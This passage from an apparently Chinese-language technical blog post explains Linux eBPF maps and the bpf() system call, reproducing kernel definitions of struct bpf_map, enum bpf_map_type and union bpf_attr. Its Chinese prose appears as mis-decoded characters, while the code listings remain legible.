ç¨‹åºä¹‹é—´è¿›è¡Œ<strong>æ•°æ®å…±äº«</strong>ï¼Œè¿™äº›æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å‚¨å­˜ï¼Œå› æ­¤ç”¨æˆ·åœ¨åˆ›å»ºæ—¶åªéœ€è¦æŒ‡å®š key ä¸ value çš„ size</p><p>bpf map ä¸»è¦æœ‰ä»¥ä¸‹äº”ä¸ªåŸºæœ¬å±æ€§ï¼š</p><ul><li><code>type</code>ï¼šmap çš„æ•°æ®ç»“æ„ç±»å‹</li><li><code>key_size</code>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½çš„ç”¨ä»¥ç´¢å¼•ä¸€ä¸ªå…ƒç´ çš„ key çš„ sizeï¼ˆåœ¨æ•°ç»„æ˜ å°„ä¸­ä½¿ç”¨ï¼‰</li><li><code>value_size</code>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½çš„æ¯ä¸ªå…ƒç´ çš„ size</li><li><code>max_entries</code>ï¼šmap ä¸­ entries çš„æœ€å¤§æ•°é‡</li><li><code>map_flags</code>ï¼šæè¿° map çš„ç‹¬ç‰¹ç‰¹å¾ï¼Œä¾‹å¦‚æ˜¯å¦æ•´ä¸ª map çš„å†…å­˜åº”è¢«é¢„å…ˆåˆ†é…ç­‰</li></ul><p>åœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ä¸€ä¸ª <code>bpf_map</code> ç»“æ„ä½“è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">/* å‰ä¸¤æ¡ç¼“å­˜è¡Œå¸¦æœ‰ä»¥è¯»å–ä¸ºä¸»çš„æˆå‘˜ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸­ä¸€äº›ä¹Ÿåœ¨å¿«é€Ÿè·¯å¾„ä¸­è¢«è®¿é—® (e.g. ops, max_entries).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">inner_map_meta</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> <span class="hljs-title">map_type</span>;</span><br>u32 key_size;<br>u32 value_size;<br>u32 max_entries;<br>u64 map_extra; <span class="hljs-comment">/* any per-map-type extra fields */</span><br>u32 map_flags;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_record</span> *<span class="hljs-title">record</span>;</span><br><span class="hljs-type">int</span> numa_node;<br>u32 btf_key_type_id;<br>u32 btf_value_type_id;<br>u32 btf_vmlinux_value_type_id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">char</span> name[BPF_OBJ_NAME_LEN];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_field_offs</span> *<span class="hljs-title">field_offs</span>;</span><br><span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="hljs-comment"> * particularly with refcounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">atomic64_t</span> refcnt ____cacheline_aligned;<br><span class="hljs-type">atomic64_t</span> usercnt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">freeze_mutex</span>;</span><br><span class="hljs-type">atomic64_t</span> writecnt;<br><span class="hljs-comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span><br><span class="hljs-comment"> * that is going to use this map or by the first program which FD is</span><br><span class="hljs-comment"> * stored in the map to make sure that all callers and callees have the</span><br><span class="hljs-comment"> * same prog type, JITed flag and xdp_has_frags flag.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-type">bool</span> jited;<br><span class="hljs-type">bool</span> xdp_has_frags;<br>&#125; owner;<br><span class="hljs-type">bool</span> bypass_spec_v1;<br><span class="hljs-type">bool</span> frozen; <span class="hljs-comment">/* write-once; write-protected by freeze_mutex */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="map-ç±»å‹"><a href="#map-ç±»å‹" class="headerlink" title="map ç±»å‹"></a>map ç±»å‹</h3><p>å¯é€‰ map ç±»å‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> &#123;</span><br>BPF_MAP_TYPE_UNSPEC,<br>BPF_MAP_TYPE_HASH,<br>BPF_MAP_TYPE_ARRAY,<br>BPF_MAP_TYPE_PROG_ARRAY,<br>BPF_MAP_TYPE_PERF_EVENT_ARRAY,<br>BPF_MAP_TYPE_PERCPU_HASH,<br>BPF_MAP_TYPE_PERCPU_ARRAY,<br>BPF_MAP_TYPE_STACK_TRACE,<br>BPF_MAP_TYPE_CGROUP_ARRAY,<br>BPF_MAP_TYPE_LRU_HASH,<br>BPF_MAP_TYPE_LRU_PERCPU_HASH,<br>BPF_MAP_TYPE_LPM_TRIE,<br>BPF_MAP_TYPE_ARRAY_OF_MAPS,<br>BPF_MAP_TYPE_HASH_OF_MAPS,<br>BPF_MAP_TYPE_DEVMAP,<br>BPF_MAP_TYPE_SOCKMAP,<br>BPF_MAP_TYPE_CPUMAP,<br>BPF_MAP_TYPE_XSKMAP,<br>BPF_MAP_TYPE_SOCKHASH,<br>BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span><br><span class="hljs-comment"> * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span><br><span class="hljs-comment"> * both cgroup-attached and other progs and supports all functionality</span><br><span class="hljs-comment"> * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span><br><span class="hljs-comment"> */</span><br>BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br>BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,<br>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,<br>BPF_MAP_TYPE_QUEUE,<br>BPF_MAP_TYPE_STACK,<br>BPF_MAP_TYPE_SK_STORAGE,<br>BPF_MAP_TYPE_DEVMAP_HASH,<br>BPF_MAP_TYPE_STRUCT_OPS,<br>BPF_MAP_TYPE_RINGBUF,<br>BPF_MAP_TYPE_INODE_STORAGE,<br>BPF_MAP_TYPE_TASK_STORAGE,<br>BPF_MAP_TYPE_BLOOM_FILTER,<br>BPF_MAP_TYPE_USER_RINGBUF,<br>BPF_MAP_TYPE_CGRP_STORAGE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¸¸ç”¨çš„ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li><code>BPF_MAP_TYPE_HASH</code>ï¼šä»¥å“ˆå¸Œè¡¨å½¢å¼å­˜å‚¨é”®å€¼å¯¹ï¼Œæ¯”è¾ƒå¸¸è§„</li><li><code>BPF_MAP_TYPE_ARRAY</code>ï¼šä»¥æ•°ç»„å½¢å¼å­˜å‚¨é”®å€¼å¯¹ï¼Œ<strong>key å³ä¸ºæ•°ç»„ä¸‹æ ‡ï¼Œå¯¹åº”çš„ value çš†åˆå§‹åŒ–ä¸º 0</strong></li><li><code>BPF_MAP_TYPE_PROG_ARRAY</code>ï¼šç‰¹æ®Šçš„æ•°ç»„æ˜ å°„ï¼Œ<strong>value ä¸ºå…¶ä»– eBPF ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦</strong></li><li><code>BPF_MAP_TYPE_STACK</code>ï¼šä»¥æ ˆå½¢å¼å­˜å‚¨æ•°æ®</li></ul><h3 id="map-wrapper"><a href="#map-wrapper" class="headerlink" title="map wrapper"></a>map wrapper</h3><h1 id="0x02-bpf-ç³»ç»Ÿè°ƒç”¨"><a href="#0x02-bpf-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0x02.bpf ç³»ç»Ÿè°ƒç”¨"></a>0x02.bpf ç³»ç»Ÿè°ƒç”¨</h1><p>æˆ‘ä»¬å¯¹ eBPF æ‰€æœ‰çš„æ“ä½œå…¶å®éƒ½æ˜¯é€šè¿‡ <code>bpf</code> ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆçš„ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span>;<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€bpf-attr-ç»“æ„ä½“"><a href="#ä¸€ã€bpf-attr-ç»“æ„ä½“" class="headerlink" title="ä¸€ã€bpf_attr ç»“æ„ä½“"></a>ä¸€ã€bpf_attr ç»“æ„ä½“</h2><p>bpf ç³»ç»Ÿè°ƒç”¨ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘è”åˆä½“ <code>bpf_attr</code> çš„æŒ‡é’ˆï¼Œå®šä¹‰äº <code>kernel/bpf/syscall.c</code> ä¸­å¦‚ä¸‹ï¼Œå¯¹äºä¸åŒçš„ <code>cmd</code>  è€Œè¨€å…¶å«ä¹‰ä¸åŒï¼Œå› æ­¤è¿™é‡Œæ˜¯ä¸€ä¸ªç”±å¤šä¸ªç»“æ„ä½“æ„æˆçš„è”åˆä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_CREATE å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32map_type;<span class="hljs-comment">/* one of enum bpf_map_type */</span><br>__u32key_size;<span class="hljs-comment">/* key æŒ‰å­—èŠ‚è®¡çš„å¤§å° */</span><br>__u32value_size;<span class="hljs-comment">/* value æŒ‰å­—èŠ‚è®¡çš„å¤§å° */</span><br>__u32max_entries;<span class="hljs-comment">/* map ä¸­æœ€å¤§çš„ entries æ•°é‡ */</span><br>__u32map_flags;<span class="hljs-comment">/* BPF_MAP_CREATE ç›¸å…³çš„</span><br><span class="hljs-comment"> * åœ¨ä¸Šé¢å®šä¹‰çš„ flags.</span><br><span class="hljs-comment"> */</span><br>__u32inner_map_fd;<span class="hljs-comment">/* æŒ‡å‘å†…éƒ¨ map çš„ fd */</span><br>__u32numa_node;<span class="hljs-comment">/* numa node (ä»…å½“è®¾ç½®äº†</span><br><span class="hljs-comment"> * BPF_F_NUMA_NODE æ—¶æœ‰æ•ˆ).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span>map_name[BPF_OBJ_NAME_LEN];<br>__u32map_ifindex;<span class="hljs-comment">/* ifindex of netdev to create on */</span><br>__u32btf_fd;<span class="hljs-comment">/* æŒ‡å‘ä¸€ä¸ª BTF ç±»å‹æ•°æ®çš„ fd */</span><br>__u32btf_key_type_id;<span class="hljs-comment">/* BTF type_id of the key */</span><br>__u32btf_value_type_id;<span class="hljs-comment">/* BTF type_id of the value */</span><br>__u32btf_vmlinux_value_type_id;<span class="hljs-comment">/* BTF type_id of a kernel-</span><br><span class="hljs-comment">   * struct stored as the</span><br><span class="hljs-comment">   * map value</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">/* Any per-map-type extra fields</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_BLOOM_FILTER - æœ€ä½ 4 ä½æŒ‡ç¤ºäº†</span><br><span class="hljs-comment"> * å“ˆå¸Œå‡½æ•°çš„æ•°é‡(è‹¥ä¸º 0, bloom filter å°†é»˜è®¤</span><br><span class="hljs-comment"> * ä½¿ç”¨ 5 ä¸ªå“ˆå¸Œå‡½æ•°).</span><br><span class="hljs-comment"> */</span><br>__u64map_extra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_ELEM å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32map_fd;<br>__aligned_u64key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__aligned_u64 value;<br>__aligned_u64 next_key;<br>&#125;;<br>__u64flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_BATCH å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__aligned_u64in_batch;<span class="hljs-comment">/* start batch,</span><br><span class="hljs-comment"> * NULL to start from beginning</span><br><span class="hljs-comment"> */</span><br>__aligned_u64out_batch;<span class="hljs-comment">/* output: next start batch */</span><br>__aligned_u64keys;<br>__aligned_u64values;<br>__u32count;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> * input: # of key/value</span><br><span class="hljs-comment"> * elements</span><br><span class="hljs-comment"> * output: # of filled elements</span><br><span class="hljs-comment"> */</span><br>__u32map_fd;<br>__u64elem_flags;<br>__u64flags;<br>&#125; batch;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_LOAD å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32prog_type;<span class="hljs-comment">/* one of enum bpf_prog_type */</span><br>__u32insn_cnt;<br>__aligned_u64insns;<br>__aligned_u64license;<br>__u32log_level;<span class="hljs-comment">/* verbosity level of verifier */</span><br>__u32log_size;<span class="hljs-comment">/* size of user buffer */</span><br>__aligned_u64log_buf;<span class="hljs-comment">/* user supplied buffer */</span><br>__u32kern_version;<span class="hljs-comment">/* not used */</span><br>__u32prog_flags;<br><span class="hljs-type">char</span>prog_name[BPF_OBJ_NAME_LEN];<br>__u32prog_ifindex;<span class="hljs-comment">/* ifindex of netdev to prep for */</span><br><span class="hljs-comment">/* For some prog types expected attach type must be known at</span><br><span class="hljs-comment"> * load time to verify attach type specific parts of prog</span><br><span class="hljs-comment"> * (context accesses, allowed helpers, etc).</span><br><span class="hljs-comment"> */</span><br>__u32expected_attach_type;<br>__u32prog_btf_fd;<span class="hljs-comment">/* fd pointing to BTF type data */</span><br>__u32func_info_rec_size;<span class="hljs-comment">/* userspace bpf_func_info size */</span><br>__aligned_u64func_info;<span class="hljs-comment">/* func info */</span><br>__u32func_info_cnt;<span class="hljs-comment">/* number of bpf_func_info records */</span><br>__u32line_info_rec_size;<span class="hljs-comment">/* userspace bpf_line_info size */</span><br>__aligned_u64line_info;<span class="hljs-comment">/* line info */</span><br>__u32line_info_cnt;<span class="hljs-comment">/* number of bpf_line_info records */</span><br>__u32attach_btf_id;<span class="hljs-comment">/* in-kernel BTF type id to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* valid prog_fd to attach to bpf prog */</span><br>__u32attach_prog_fd;<br><span class="hljs-comment">/* or valid module BTF object fd or 0 to attach to vmlinux */</span><br>__u32attach_btf_obj_fd;<br>&#125;;<br>__u32core_relo_cnt;<span class="hljs-comment">/* number of bpf_core_relo */</span><br>__aligned_u64fd_array;<span class="hljs-comment">/* array of FDs */</span><br>__aligned_u64core_relos;<br>__u32core_relo_rec_size; <span class="hljs-comment">/* sizeof(struct bpf_core_relo) */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_* å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__aligned_u64pathname;<br>__u32bpf_fd;<br>__u32file_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_ATTACH/DETACH å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to attach to */</span><br>__u32attach_bpf_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br>__u32attach_type;<br>__u32attach_flags;<br>__u32replace_bpf_fd;<span class="hljs-comment">/* previously attached eBPF</span><br><span class="hljs-comment"> * program to replace if</span><br><span class="hljs-comment"> * BPF_F_REPLACE is used</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_TEST_RUN å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32prog_fd;<br>__u32retval;<br>__u32data_size_in;<span class="hljs-comment">/* input: len of data_in */</span><br>__u32data_size_out;<span class="hljs-comment">/* input/output: len of data_out</span><br><span class="hljs-comment"> *   returns ENOSPC if data_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64data_in;<br>__aligned_u64data_out;<br>__u32repeat;<br>__u32duration;<br>__u32ctx_size_in;<span class="hljs-comment">/* input: len of ctx_in */</span><br>__u32ctx_size_out;<span class="hljs-comment">/* input/output: len of ctx_out</span><br><span class="hljs-comment"> *   returns ENOSPC if ctx_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64ctx_in;<br>__aligned_u64ctx_out;<br>__u32flags;<br>__u32cpu;<br>__u32batch_size;<br>&#125; test;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_*_GET_*_ID å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32start_id;<br>__u32prog_id;<br>__u32map_id;<br>__u32btf_id;<br>__u32link_id;<br>&#125;;<br>__u32next_id;<br>__u32open_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_GET_INFO_BY_FD å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32bpf_fd;<br>__u32info_len;<br>__aligned_u64info;<br>&#125; info;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_QUERY å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to query */</span><br>__u32attach_type;<br>__u32query_flags;<br>__u32attach_flags;<br>__aligned_u64prog_ids;<br>__u32prog_cnt;<br><span class="hljs-comment">/* output: per-program attach_flags.</span><br><span class="hljs-comment"> * not allowed to be set during effective query.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64prog_attach_flags;<br>&#125; query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct used by BPF_RAW_TRACEPOINT_OPEN command */</span><br>__u64 name;<br>__u32 prog_fd;<br>&#125; raw_tracepoint;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct for BPF_BTF_LOAD */</span><br>__aligned_u64btf;<br>__aligned_u64btf_log_buf;<br>__u32btf_size;<br>__u32btf_log_size;<br>__u32btf_log_level;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32pid;<span class="hljs-comment">/* input: pid */</span><br>__u32fd;<span class="hljs-comment">/* input: fd */</span><br>__u32flags;<span class="hljs-comment">/* input: flags */</span><br>__u32buf_len;<span class="hljs-comment">/* input/output: buf len */</span><br>__aligned_u64buf;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> *   tp_name for tracepoint</span><br><span class="hljs-comment"> *   symbol for kprobe</span><br><span class="hljs-comment"> *   filename for uprobe</span><br><span class="hljs-comment"> */</span><br>__u32prog_id;<span class="hljs-comment">/* output: prod_id */</span><br>__u32fd_type;<span class="hljs-comment">/* output: BPF_FD_TYPE_* */</span><br>__u64probe_offset;<span class="hljs-comment">/* 